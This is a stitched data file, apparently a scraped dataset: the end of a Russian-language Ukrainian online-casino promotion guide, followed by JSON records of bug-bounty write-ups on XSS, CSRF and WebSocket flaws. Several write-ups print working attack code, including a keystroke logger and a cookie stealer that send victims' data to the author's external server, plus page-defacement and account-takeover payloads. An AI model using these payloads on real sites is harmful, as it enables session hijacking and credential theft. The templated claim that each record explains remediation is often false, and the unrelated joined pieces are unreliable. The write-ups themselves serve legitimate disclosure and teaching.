риски и ограничения Игровая зависимость. Некоторые пользователи могут столкнуться с аддикцией. Надёжные казино предлагают функцию самоисключения или лимитов для контроля. Финансовые потери. Азартные игры не гарантируют доход; ставки связаны с риском потерь. Ограничения доступа. Платформы с лицензией КРАИЛ доступны только пользователям из Украины, а иностранные казино могут быть заблокированы. Скорость вывода средств. В зависимости от метода платежей, процесс может занимать до 3 рабочих дней, что требует планирования. Блокировки и технические проблемы. Иногда из-за сбоев или интернет-ограничений доступ к платформам может быть временно недоступен. Мы всегда рекомендуем взвешивать преимущества и риски, чтобы делать ставки осознанно и получать только позитивные эмоции. Советы для новичков Новые игроки часто сталкиваются с трудностями из-за отсутствия опыта. Давайте разберёмся, как сделать старт в украинских онлайн-казино комфортным и безопасным. Как начать игру без ошибок Выбор лицензированного казино. Играть стоит только на платформах с лицензией КРАИЛ. Это гарантирует защиту данных и честные выплаты. Регистрация с корректными данными. Указываем только реальные данные: имя, дату рождения и контактную информацию, чтобы избежать проблем с выводом средств. Изучение правил игры. Читаем правила каждого автомата или стола, особенно перед ставками на реальные деньги. Это помогает понимать механику и избегать неоправданных потерь. Определение бюджета. Устанавливаем дневной или недельный лимит на ставки. Это предотвратит финансовые риски и сохранит положительные эмоции. Проверка отзывов. Читаем мнения пользователей об условиях вывода средств, поддержке и игровых автоматах. Частые ошибки игроков Игнорирование лицензии. Некоторые новички выбирают незарегистрированные казино из-за бонусов, что может привести к потере средств. Пренебрежение акциями. Игроки не используют приветственные бонусы или программы лояльности, хотя они увеличивают шансы на выигрыш. Отсутствие стратегии. Делать ставки хаотично — одна из типичных ошибок. Лучше придерживаться стратегии и применять аналитику. Эмоциональные решения. Азарт часто мешает вовремя остановиться, что ведёт к превышению бюджета. Неправильный выбор игр. Игры без понимания коэффициентов выигрыша (RTP) могут принести меньше удовольствия и больше потерь. Итог Украинские онлайн-казино продолжают радовать нас своим разнообразием, удобством и безопасностью. Благодаря лицензированию, современным технологиям и широкому выбору игр, каждый игрок может найти платформу, которая идеально соответствует его предпочтениям. Мы уверены, что осознанный подход к выбору казино и соблюдение простых рекомендаций помогут вам наслаждаться игрой, избегая неприятных ситуаций. Не забывайте об ответственности и играйте для удовольствия, а не ради риска. Пусть ваш опыт в украинских онлайн-казино будет захватывающим, а удача всегда на вашей стороне! Часто задаваемые вопросы Какие критерии важны при выборе онлайн-казино в Украине? Для выбора надежного онлайн-казино обратите внимание на наличие лицензии, разнообразие игр, методы оплаты, бонусные программы, репутацию и отзывчивость технической поддержки. Проверка этих параметров гарантирует честность, безопасность и комфортный игровой опыт. Какие казино популярны в Украине в 2023 году? Особой популярностью пользуются Cosmolot, Parimatch, JacobCasino и Slotoking. Эти платформы предлагают широкий выбор игр, бонусы и удобный пользовательский интерфейс. Какие способы оплаты доступны в украинских онлайн-казино? Часто используются Visa, Mastercard, Monobank, Приват24, Qiwi, криптовалюты (Bitcoin, Ethereum) и мобильные платежи. Время зачисления депозита обычно мгновенное, а вывод средств может занять от 1 до 3 рабочих дней. Насколько безопасны игры в онлайн-казино? Безопасность обеспечивается лицензированием, шифрованием данных и честными системами генерации случайных чисел. Игрокам рекомендуется выбирать только лицензированные платформы. Какие бонусы можно получить в украинских онлайн-казино? Бонусы включают приветственные пакеты, бесплатные вращения, кешбэк и программы лояльности. Эти акционные предложения увеличивают шансы на выигрыш. Какие риски связаны с игрой в онлайн-казино? Основные риски — это финансовые потери, игровая зависимость и технические проблемы. Для минимизации рисков важно играть осознанно и придерживаться установленного бюджета. Можно ли играть в украинских казино на мобильных устройствах? Да, большинство онлайн-казино предлагают мобильные приложения или адаптированные версии сайта, что позволяет играть в любое время и в любом месте. Как быстро проходят финансовые транзакции в казино? Депозиты обычно зачисляются мгновенно, а вывод средств может занимать от нескольких часов до 3 рабочих дней в зависимости от метода платежа. Как проверить легальность онлайн-казино в Украине? Убедитесь, что казино имеет лицензию от КРАИЛ (Комиссии по регулированию азартных игр и лотерей). Информация о лицензии должна быть указана на официальном сайте казино. Какие ошибки новички допускают при игре в онлайн-казино? Частые ошибки — игнорирование лицензии, ставка больше установленного бюджета, отсутствие стратегии и эмоциональные решения. Избегайте этих ошибок для улучшения игрового опыта. Copyright © 2025 - all rights reserved by mohamedharon.com Прокрутка вверх"}
{"source_url": "https://medium.com/@armaanpathan/dont-just-alert-1-because-xss-is-for-fun-f88cfb88d5b9", "title": "Don’t just alert(1) , Because XSS is for fun…!! | by Armaan Pathan | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@armaanpathan/dont-just-alert-1-because-xss-is-for-fun-f88cfb88d5b9. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nDon’t just alert(1) , Because XSS is for fun…!! | by Armaan Pathan | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Don’t just alert(1) , Because XSS is for fun…!! Armaan Pathan 3 min read · Sep 2, 2017 -- 1 Listen Share Press enter or click to view image in full size It was weekend and i was reading some good blogs and looking for good tweets.So after reading some good blog i had decided to give them a try. so this time i chose cobalt.io because i had never hunted on this platform so why not give a try. I had selected my target. which was www.optimizely.com and started looking for some cool bugs. In the application i had found a module which is Create Experiment Press enter or click to view image in full size here you have to enter your website’s URL and give a name and you can do experiments on your website. So simply i had fill up the form by entering my website and given the Experiment name.and my website was loaded into the module, now here i was able to do experiments on my web application. Now there was an option to preview your experiments, Now this option will open the new tab and it will show the experiments which you have done with your application, so first i had not done any experiments and clicked on Preview. So it has opened www.optimizelypriview.com /www.mysite.com in the new tab and it has opened my website into it. Now as it was loading my website within this so i though lets give a try. i had wrote <script>prompt(docoument.domain);</script> into my site and again i put my site into the experiments.and again i clicked on preview.it has opened www.optimizelypriview.com /www.mysite.com in the new tab, but at this time instead of prompting my domain’s name into the pop-up it has prompted www.optimizelypriview.com . :) so yes here i was able to call scripts on the www.optimizelypriview.com from the different domain. Press enter or click to view image in full size I wanted to exploit this xss. so i decided to write small javascript which records the key strokes and give that strokes back to my server where i have hosted my website. So i wrote this to record the keystrokes document.onkeypress = function(evt) { evt = evt || window.event key = String.fromCharCode(evt.charCode) if (key) { var http = new XMLHttpRequest(); var param = encodeURI(key) http.open(“POST”,”http://armaanpathan.pe.hu/exploit.php\",true); http.setRequestHeader(“Content-type”,”application/x-www-form-urlencoded”); http.send(“key=”+param); } } and also wrote this to give that keystrokes back to my server and make keylog.txt file and save the keystrokes. <?php $key=$_POST[‘key’]; $logfile=”keylog.txt”; $fp = fopen($logfile, “a”); fwrite($fp, $key); fclose($fp); ?> and after writing this i had updated my website. now what this do, as soon as the page loads the javascript starts recording the keystrokes and makes a file keylog.txt and saves all the logs. now again i put my site into the experiments.and again i clicked on preview.it has opened www.optimizelypriview.com /www.mysite.com. and it has started logging key logs to my server and made a file keylog.txt Press enter or click to view image in full size and if now if i send this link to any victim it starts logging all keystrokes which victim types. and if i open the keylog.txt file it will look like this. Press enter or click to view image in full size but unfortunately the team www.optimizely.com said that this domain is not in the scope :(. but yeah. i had learn many things from this. :D I hope you guys have like it. :) Thanks for reading. Have Great Day. Security Xss Attack Cross Site Scripting Bug Bounty -- -- 1 Written by Armaan Pathan 1.6K followers · 4 following Responses ( 1 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://ladysecspeare.wordpress.com/2020/04/05/how-a-simple-csrf-attack-turned-into-a-p1-level-bug/", "title": "How a Simple CSRF Attack Turned into a P1 Level Bug – Lady Secspeare", "friendly_explanation": "This is a bug bounty writeup from https://ladysecspeare.wordpress.com/2020/04/05/how-a-simple-csrf-attack-turned-into-a-p1-level-bug/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nHow a Simple CSRF Attack Turned into a P1 Level Bug – Lady Secspeare Skip to content Lady Secspeare Spearing the Security for Good How a Simple CSRF Attack Turned into a P1 Level Bug Posted by Lady Secspeare April 5, 2020 April 5, 2020 Posted in Uncategorized Tags: Bug Bounty , Bug Bounty Hunting , Bugcrowd , Bypassing CSRF , Cross-site Request Forgery , CSRF , CSRF Bypass , P1 Cross-site Request Forgery is easy to lookout for. However, if there are security measures in place to prevent CSRF attacks, they can be exciting (yet nerve-wracking) to bypass. For those who don’t know, Cross-site Request Forgery is an attack where a malicious user can trick the victim into performing actions that they do not intend to do. And some of the preventive measures are: Use of anti-CSRF tokens Use of additional fields such as “Current Password” Use of same site cookies How I Began the Hunt When I received an invite to hunt on a private program on Bugcrowd, which was set to begin on 9th of February, 12AM IST, I was prepared to begin. Considering I was blind to the name of the program and there were 24 other chosen security researchers, I decided to hunt on the website head-on – without any recon. I started looking for endpoints to perform a CSRF attack, I found the most impactful one: Change Password option. When I clicked on it, the following fields were a part of the entire HTTP Request: Mandatory email address field I suspected that the Email field will interfere as it was a mandatory one, but still tried performing CSRF with it. Since, the CSRF POC contained the attacker’s email address when updating the victim’s password it obviously didn’t work. It will only work if I updated the value as victim’s email address in the Email field. So, as an attacker, every time I send the malicious link to the victim, I would have to use the victim’s email address before tricking them into clicking it. It didn’t sit well with me. I wanted to increase the impact. How I Increased the Impact I tried to following: I removed the entire field from the CSRF POC. I only removed the value from the field. I entered random values in the field. (ajhgdsjhgd) None of the above worked. I almost gave up thinking they have secured it against advanced CSRF attacks. I then decided to try something else: I changed the email to a random value with the correct email address format. It didn’t have to be a valid email address; just anything as random as abcdefg@xyz.com. CSRF PoC with random email address I clicked on “Submit” from another browser, acting as the victim, and got the following message: Message for Successfull Password Change using CSRF attack I didn’t want to celebrate just yet. To be sure, I tried logging into victim’s account as the attacker, using the new password. Voila! I was logged in, implying I had successfully changed the victim’s password. Impact This scenario allowed me to take over the victim’s account without any effort of changing the email address value to the victim’s valid address. Furthermore, the severity level increased because just clicking on the link will have the victim locked out of their own account. Bugcrowd rated this simple CSRF as P1 as it was a complete account takeover issue. Why this was possible? Because there was no server-side validation of the Email field. And hence, the remediation for such problem would be to ensure the necessary validation is in place. Takeaway If you ever come across such fields, try to perform CSRF by giving random values, assuming there is no server-side validation. You may just come across a P1 issue. Now, wouldn’t it be a cherry on the top if the program is offering bounty? Share your thoughts. Cheers! Share this: Click to share on X (Opens in new window) X Click to share on Facebook (Opens in new window) Facebook Like Loading... Related Posted by Lady Secspeare April 5, 2020 April 5, 2020 Posted in Uncategorized Tags: Bug Bounty , Bug Bounty Hunting , Bugcrowd , Bypassing CSRF , Cross-site Request Forgery , CSRF , CSRF Bypass , P1 Published by Lady Secspeare Spearing the Security for Good View more posts Post navigation Previous Post Previous post: Reaching Out to Fellow Beginners in Bug Bounty Hunting Next Post Next post: How I Scored my CompTIA Security+ Certification 7 thoughts on “ How a Simple CSRF Attack Turned into a P1 Level Bug ” Rajesh says: April 5, 2020 at 1:58 pm Thanks for sharing, as expected, you well explained the scenario of account takeover using CSRF. eagerly waiting for next one. Keep inspiring Like Liked by 1 person Reply Lady Secspeare says: April 5, 2020 at 3:52 pm Thanks for the support 🙂 Like Like Reply Pingback: These Bug Bounty Writeups will Change Your Life - PrimeHackers jaykeerti says: July 20, 2020 at 8:17 am I am wondering why it didn’t work for attacker’s email. Because its similar to random one right? 😕 Like Liked by 1 person Reply Lady Secspeare says: July 20, 2020 at 3:27 am Hey. Thanks for reading this blogpost and commenting. The attack couldn’t complete with the attacker’s email address because it the application identified it as an existing user’s email. If the attacker uses an email that does not have an account on the website, the attack will be successful. Thanks for asking a valid question 🙂 Like Liked by 1 person Reply jaykeerti says: July 20, 2020 at 10:45 am Gotcha. Thanks 😊👍 Like Like Pingback: Full Victim Account Takeover Due to no CSRF Protection (POC) - Cyber World Leave a comment Cancel reply Δ Lady Secspeare , Blog at WordPress.com. Privacy & Cookies: This site uses cookies. By continuing to use this website, you agree to their use. To find out more, including how to control cookies, see here: Cookie Policy Comment Reblog Subscribe Subscribed Lady Secspeare Sign me up Already have a WordPress.com account? Log in now. Lady Secspeare Subscribe Subscribed Sign up Log in Copy shortlink Report this content View post in Reader Manage subscriptions Collapse this bar Loading Comments... Write a Comment... Email (Required) Name (Required) Website %d Design a site like this with WordPress.com Get started"}
{"source_url": "https://medium.com/@TheShahzada/reflected-xss-in-yahoo-6e2b6b177448", "title": "Reflected XSS in Yahoo!. Shahzada Al Shahriar Khan Thursday… | by Shahzada AL Shahriar Khan | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@TheShahzada/reflected-xss-in-yahoo-6e2b6b177448. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nReflected XSS in Yahoo!. Shahzada Al Shahriar Khan Thursday… | by Shahzada AL Shahriar Khan | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Reflected XSS in Yahoo! Shahzada AL Shahriar Khan 2 min read · Aug 31, 2017 -- Listen Share Shahzada Al Shahriar Khan Thursday, August 31, 2017 Bug Bounty Cross-Site Scripting Ethical Hacking Hackerone Reflected XSS in Yahoo XSS In Yahoo Hello Guys, This is Shahzada Al Shahriar Khan. Known as TheShahzada . I am from Bangladesh . And I am Newbie in Bug Bounty. :P Well, Now I will share how I found Reflected Cross-Site Scripting (XSS) in main & sub domain of Yahoo. Vulnerable URL: 1. https://www.yahoo.com/movies/film/[*] 2. https://ca.yahoo.com/movies/film/[*] Payload I Use: “><%2fscript><script>alert(document.domain)<%2fscript> PoC URL: 1. https://www.yahoo.com/movies/film/\"><%2fscript><script>alert(document.domain)<%2fscript> 2. https://ca.yahoo.com/movies/film/\"><%2fscript><script>alert(document.domain)<%2fscript> PoC: Press enter or click to view image in full size Press enter or click to view image in full size Yahoo Canada Subdomain Video PoC: https://youtu.be/QHRbzyIlpkc Timeline: Aug 12th — I Submitted The Report. Aug 15th — Triaged The Report & Rewarded Me $300 Initial Bounty. Aug 16th — Resolved Aug 24th — $400 Bounty Rewarded. ./The_S Originally published at blog.theshahzada.com on August 31, 2017. Yhaoo Xss Yahoo Bug Bounty Ethical Hacking Hackerone -- -- Written by Shahzada AL Shahriar Khan 490 followers · 2 following ~InfoSec Enthusiast, Bug Bounty Hunter, CTF Player…/ No responses yet Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@Alra3ees/my-write-up-about-uber-cross-site-scripting-by-help-of-knoxss-b1b56f8d090", "title": "My write up about UBER Cross-site scripting by help of KNOXSS | by Emad Shanab | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@Alra3ees/my-write-up-about-uber-cross-site-scripting-by-help-of-knoxss-b1b56f8d090. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nMy write up about UBER Cross-site scripting by help of KNOXSS | by Emad Shanab | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in My write up about UBER Cross-site scripting by help of KNOXSS Emad Shanab 2 min read · Sep 2, 2017 -- Listen Share Sorry for my bad English This is my first write up about bug bounty. but i will do it to support the great man @brutelogic and his great tool @knoxss_me It was a dream to find XSS in uber and be in uber HOF So i made a purchase to @knoxss_me ( pro version) and start looking for XSS in uber sub domains I used some tools to extract sub domains like Sublist3r and aquatone After a long time of looking i have found this sub domain https://payment-providers.uber.com So i noticed that it is not show any thing just a white page so i started brute force to get any bugs or directory listing or any valid parameters or files I used dirb tool in kali linux to brute force valid parameters https://tools.kali.org/web-applications/dirb And after some time i got this end point https://payment-providers.uber.com/health/ Press enter or click to view image in full size So i fired up the @knoxss_me and for my good luck i got the magic XSS box from @knoxss_me service KNOXSS service I was very happy to got it and i tweeted about it before report it But my signal in hackerone is too low so i sent an email to uber support email and Rob Fletcher from uber support team white listed my account to report it in hackerone Press enter or click to view image in full size Final report to uber uber Cross site scripting After that i reported it and they triaged it and got 500$ Press enter or click to view image in full size Thanks to @brutelogic and @knoxss_me and special thanks to @knowledge_2014 for supporting me Time line:- 07/08/2017 Email sent to security-abuse@uber.com 07/08/2017 Got replay from Rob Fletcher said Ok, cool, you’re account should be whitelisted 07/08/2017 Reported to uber hackerone page 08/08/2017 changed the status to Triaged and rewarded with a $500 bounty 23/08/2017 closed the report and changed the status to Resolved 25/08/2017 decided that this report is not eligible for a bounty because payment-providers.uber.com isn’t typically used in a web browser Security -- -- Written by Emad Shanab 1.8K followers · 172 following A lawyer & A noooob & every law has it’s own bugs 🐜 No responses yet Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/bugbountywriteup/chaining-self-xss-with-ui-redressing-is-leading-to-session-hijacking-pwn-users-like-a-boss-efb46249cd14", "title": "Chaining Self XSS with UI Redressing is Leading to Session Hijacking (PWN users like a boss) | by Armaan Pathan | InfoSec Write-ups", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/bugbountywriteup/chaining-self-xss-with-ui-redressing-is-leading-to-session-hijacking-pwn-users-like-a-boss-efb46249cd14. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nChaining Self XSS with UI Redressing is Leading to Session Hijacking (PWN users like a boss) | by Armaan Pathan | InfoSec Write-ups Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in InfoSec Write-ups · Follow publication A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: https://weekly.infosecwriteups.com/ Follow publication Chaining Self XSS with UI Redressing is Leading to Session Hijacking (PWN users like a boss) Armaan Pathan 2 min read · Sep 18, 2017 -- 1 Listen Share while i was testing the web application i have found self xss. which has no impact. but i wanted to exploit this vulnerability, so have started thinking that how can i exploit this self xss, and then i have decided to chain the self xss with some other vulnerability. so again a have stared looking for CSRF attack, but i dint get CSRF on the vulnerable page. But i had noticed that application was not using the x-frame header. so thought lets check for click jacking. ! and yeah ! application was vulnerable with click jacking. so have decided to chain Self xss with click jacking. Here is the Click jacking which is chained with self xss which grabs victim’s cookies. <html> <head><title>Poc</title></head> <body bgcolor=”gray”> <h1 align=”center”>DRAG N DROP GAME</h1> <br><br><br> <img src=” https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSi0I3s6J4VZohcVZbzUzJ-g-y722W8jqyo4g1lc0HhM9SH9WN9 \" draggable=true id=drag ondragstart=”event.dataTransfer.setData(‘text/plain’,’<script>location=` http://armaanpathan.pe.hu/cookies.php?cookie=`+btoa(document.cookie) </script>')\"> <br><br><br> <style type=”text/css”> iframe { width: 800px; height: 650px; position: absolute; top: 2; right: 10; filter: alpha(opacity=50); opacity: 0.00 ; </style> <style type=”text/css”> h2{ position: absolute; top: 420; right: 30; } </style> <iframe src=”www.victim.com\"></iframe> <H2>DRAG THE IMAGE HERE</h2> </html> here is the code which saves the grabbed cookies in txt file <?php $c=$_GET[‘cookie’]; file_put_contents(“cookies.txt”,$c . “\\n\\n”,FILE_APPEND); ?> Press enter or click to view image in full size Press enter or click to view image in full size and yeah i was able to hijack any user’s sessions. Here is the PoC video Spacial thanks to Rahul Maini . for helping me. :) thanks for reading. :) Hacking Bug Bounty Hackerone Bugcrowd Cross Site Scripting -- -- 1 Follow Published in InfoSec Write-ups 67K followers · Last published 18 hours ago A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: https://weekly.infosecwriteups.com/ Follow Written by Armaan Pathan 1.6K followers · 4 following Responses ( 1 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://guptashubham.com/stored-xss-to-full-information-disclosure/", "title": "Shubham Gupta - Security Researcher & Ethical Hacker", "friendly_explanation": "This is a bug bounty writeup from https://guptashubham.com/stored-xss-to-full-information-disclosure/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nShubham Gupta - Security Researcher & Ethical Hacker Shubham Gupta Security Researcher & Bug Hunter What is Hacking? Hall of Fame Recognized by leading tech companies View All Security Researcher & Bug Hunter | | Ranked bug bounty hunter and security researcher with expertise in identifying critical vulnerabilities. Specializing in web application security, network penetration testing, and security research. 600+ Hall of Fame recognitions 1337+ Bugs reported successfully 50+ Security projects completed Penetration Testing Comprehensive security assessments for web/mobile applications and networks Bug Bounty Hunting Ranked bug bounty hunter with proven track record Security Research Deep dive into application security and vulnerability research CTF Player Active participant in web and mobile CTF challenges Tap on the pointers to learn more Achievements 0 Hall of Fame 0 Bugs Reported 0 Projects CPU Client Reviews Testimonials Put your security skills to the test in our interactive hacking playground Learn by Doing Hands-on experience with real-world security scenarios Build Portfolio Track progress and showcase your achievements to employers Community Support Connect with peers and get help from experienced hackers Realistic Scenarios Practice on environments that mirror real-world applications Earn Rewards Collect points, badges, and certificates as you complete challenges Level Up Skills Progressive difficulty to help you grow from beginner to expert Capture The Flag Challenges Test your skills. Learn new techniques. Earn rewards. esc F1 F2 F3 F4 F5 F6 F7 F8 F8 F10 F11 F12 ~ ` ! 1 @ 2 # 3 $ 4 % 5 ^ 6 & 7 * 8 ( 9 ) 0 â _ + = delete tab Q W E R T Y U I O P { [ } ] | \\ caps lock A S D F G H J K L : ; \" ' return shift Z X C V B N M < , > . ? / shift fn control option command command option Coming Soon Learn by Doing Hands-on experience with real-world security scenarios Build Portfolio Track progress and showcase your achievements to employers Realistic Scenarios Practice on environments that mirror real-world applications Earn Rewards Collect points, badges, and certificates as you complete challenges Level Up Skills Progressive difficulty to help you grow from beginner to expert Join the waitlist Learn more"}
{"source_url": "https://medium.com/@saamux/reflected-xss-on-www-yahoo-com-9b1857cecb8c", "title": "Reflected XSS on www.yahoo.com. Hello guys, my name is Samuel I’m a bug… | by Samuel | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@saamux/reflected-xss-on-www-yahoo-com-9b1857cecb8c. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nReflected XSS on www.yahoo.com. Hello guys, my name is Samuel I’m a bug… | by Samuel | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Reflected XSS on www.yahoo.com Samuel 1 min read · Aug 12, 2017 -- 3 Listen Share Hello guys, my name is Samuel I’m a bug hunter from Chile, it’s my first post about bug bounty programs. Today, I want to share with you a XSS which I found in main domain of Yahoo. I have detected a Reflected XSS in this website. The vulnerable endpoint was the next: https://www.yahoo.com/author/vulnerablendpoint Press enter or click to view image in full size vulnerable endpoint Every time I put any text, it was reflected on the web site. After adding the payload, I saw https://www.yahoo.com/author/ \"><%2fscript><script>alert(document.domain)<%2fscript> The simple payload was working. Press enter or click to view image in full size I managed to notice the presence of the vulnerability, now I share the simple payload that I used. Finally I share the video that I did about this vulnerability. Timeline July 20 — I sent to report July 20 —Triaged July 23 — Resolved August 8 — Bounty for me :D Thanks @saamux Security Bug Bounty -- -- 3 Written by Samuel 616 followers · 10 following Responses ( 3 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@osamaavvan/exploiting-websocket-application-wide-xss-csrf-66e9e2ac8dfa", "title": "Exploiting WebSocket [Application Wide XSS / CSRF] | by Osama Avvan | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@osamaavvan/exploiting-websocket-application-wide-xss-csrf-66e9e2ac8dfa. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nExploiting WebSocket [Application Wide XSS / CSRF] | by Osama Avvan | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Exploiting WebSocket [Application Wide XSS / CSRF] Osama Avvan 5 min read · Feb 17, 2020 -- 4 Listen Share Assalam u Alikum, it’s been a while I haven’t contributed to this wonderful community so I am back with a new write up about WebSocket which is fun to exploit. So first of all what is WebSocket? WebSockets allow the client/server to create a 'full-duplex' (two-way) communication channels, allowing the client and server to truly communicate asynchronously, simply both client/server can send and receive messages. So unlike some API endpoints where developers strictly check the Origin Header value, but here in WebSocket case they mostly ignore it, which in result allows any arbitrary Origin to make a connection to the WebSocket instance of the Web App. The format of a WebSocket URL is like this, wss://readact.com, here wss:// is used for a secure SSL connection like https:// some web apps also uses ws:// which is like http:// Now we will look for some places where we can find the WebSocket URL or endpoint. The handiest and easiest way to find WebSocket endpoint is the BurpSuite WebSockets history tab. BurpSuite > Proxy > WebSockets history There you will see all the history of WebSockets requests. The other place where you can look for WebSocket endpoint is the Network tab of your Browser Developer Tool. If WebSocket connection request is sent to the server you will find it there. Now the Place where there is a 99% chance of finding the WebSocket endpoint if the WebApp is using WebSocket is the JavaScript files or the page source of the WebApp, Search for these keywords in the JavaScript file. wss:// ws:// websocket Now after finding the WebSocket endpoint, we have to check if the endpoint is accepting the connection from other Origins . For this simply head to https://www.websocket.org/echo.html and in the Location textbox enter the WebSocket URL/endpoint . Click on the Connect button in the Log box you will get the response, if the connection was successful it will print Connected or if the connection fails it will print DISCONNECTED. You can also check the connection with BurpSuite. From the Burp Repeater send the Request with your Origin in the Origin Header value . If the server responds with a status code of 101 and your specified Origin is reflected OR if you see an * in the Origin header in the response this means that the connection was successful. Now let’s take a look at a Real-World Webapp scenario, I was hunting a private program so when I was inspecting the source code of the dashboard page of the domain, I came across this piece of code. var wsUri = ‘wss://ex.target.com//ex-new/portal/websocket’; var ws = new WebSocket(wsUri); This confirms that the web app was using WebSocket, now I had to confirm that it accepts connections from other domains too. there are many ways to confirm it which I have also mentioned above, for this case, I just open up a new tab and in from the console I executed this code. var wsUri = ‘wss://ex.target.com//ex-new/portal/websocket’; var ws = new WebSocket(wsUri); ws.onopen = function(e) { console.log(e); } The connection was established and I got the response in the console. Press enter or click to view image in full size So now I can send data to the server and can also receive data from the server. building a (Two-way Communication). Now I set up a listener to listen for incoming and outgoing communication from the server. But there wasn’t anything confidential to listen for. ws.onmessage = function(e) { console.log(e.data); } So now I tried to send a message to the server and was curious that how the server will handle it on the client-side. ws.send(“hello you are vulnerable”); But there was no reflection of the message in the client-side source code. After reading the JS files of the web app, I found a function which was handling the message received from the WebSocket, The data received from the server was being checked in a conditional statement , ws.onmessage = function(e) { if (e.data.indexOf(“||”) > 0) { var messs = e.data.split(“||”); let alertId = messs[0]; var type = messs[1]; let alertDom = messagee(alertId); } } So the data returned by the server must have || in between. and if the condition fulfilled then the data was rendered in the HTML of the page inside a tag. So to confirm that the data is placed inside the tag I sent a message to the server from my connected instance of WebSocket. ws.onopen = function(e) { ws.send(\"hello||you are vulnerable\"); }; Press enter or click to view image in full size and it worked :) Now to perform an XSS I just had to break out of the <a> tag, for this I wrote this code. <script language=”javascript” type=”text/javascript”> var wsUri = ‘wss://ex.target.com//ex-new/portal/websocket’; var ws = new WebSocket(wsUri); ws.onopen = function(e){ console.log(e); var a = `”><script>alert(‘XSS’)<\\/script>||leetwa`; ws.send(a); } ws.onmessage = function (evt){ var received_msg = evt.data; console.log(evt.data); } ws.onclose = function(a){ console.log(a);} </script> There I got XSS on all the pages of the web app which were using WebSockets , similarly, I was able to perform CSRF attacks on all the pages using WebSockets and was able to modify the Content of the pages which were using WebSockets making the XSS, CSRF, Content Injection Application wide. Performing a malicious request to change victim email. ws.onopen = function(e) { console.log(e); const payload = `(function(){ const $ = e => document.querySelector(e); $(“#lastName”).value = “Hacked”; $(“#firstName”).value = “Account”; `$(“#company”).value = “Bad Company”; $(“#jobTitle”).value = “Hacker”; $(“#email”).value = “cyber.spidey@hacked.com”; $(“.btn-primary”).click(); `})();` var a = `”><script>${payload}<\\/script>||leetwa` ws.send(a); `}; I hosted this code on my webserver and I just had to send it to the victim and there you go, victim email will be changed or the XSS will execute on all of the pages of the web app. or else I could have changed the HTML of all the open pages by this code. ws.onopen = function(e) { console.log(e); const payload = “<center><h1>You have been Hacked</h1><br> <br><h1>Contact here: <a href=’https://evil.com'>Evil.com</a></h1></center>\" var a = `”><script>document.querySelector(“body”).innerHTML = “${payload}”<\\/script>||leetwa` `ws.send(a); }; That’s it Thank you for reading, the bug was accepted as a P1. Press enter or click to view image in full size Bug Bounty Infosecurity Bug Hunting Websocket JavaScript -- -- 4 Written by Osama Avvan 1.1K followers · 0 following Security Researcher, ❤️ To Code. Find me at: https://twitter.com/osamaavvan Responses ( 4 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://bugbaba.blogspot.com/2017/08/xss-because-of-wrong-content-type-header.html", "title": "XSS Because of wrong Content-type Header", "friendly_explanation": "This is a bug bounty writeup from https://bugbaba.blogspot.com/2017/08/xss-because-of-wrong-content-type-header.html. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nXSS Because of wrong Content-type Header Skip to main content Search This Blog NomanAli181 | BugBaba Discoveries and Writings of security vulnerabilities that I have discovered XSS Because of wrong Content-type Header Get link Facebook X Pinterest Email Other Apps August 04, 2017 Hello All, XSS because of Wrong content type in InternShala.com Internshala : Internshala is an internship platform, this website helps students find internships with organisations in India - wiki While checking this site I got an endpoint which didn't had CSRF protection. I can change the user details (name, address,etc) Not email :( One thing that was weird with that endpoint was that it was giving a JSON response But the content type header was not : application/javascript Rather it was set as : text/html I was fiddling with that as I knew if we can inject html then we can get XSS here :D But they had filters so it was just HTML Injection -_- that isn't cool to report But there was another parameter current_city_administrative_area_level_2 changing its value caused and error Lets Build Payload Problem no (1) White space was not allowed between text and neither forward slash / was allowed so I use + for that :p Payload : <h1+onmouseover Now i was able to inject event handlers :D Problem no (2) Next alert and prompt was blocked :v But they forgot confirm :D Payload : <h1+onmouseover=confirm Problem no (3) Parentheses/brackets ( ) were blocked :3 so i use backtick ` instead Payload : <h1+onmouseover=confirm`1` Problem no (4) we need to end the tag with > but this wasn't allowed -_- so i use +%0a for that :v Payload : <h1+onmouseover=confirm`1`+%0a>Lol</h1> Finally it worked ^_^ So keep an eye at the Content-type header when there is JSON response My Reaction My XSS Guru's @ soaj1664ashar @ brutelogic @ Asystolik Note : This bug is Patched by InternShala Team Thanks Bugbounty XSS Get link Facebook X Pinterest Email Other Apps Comments 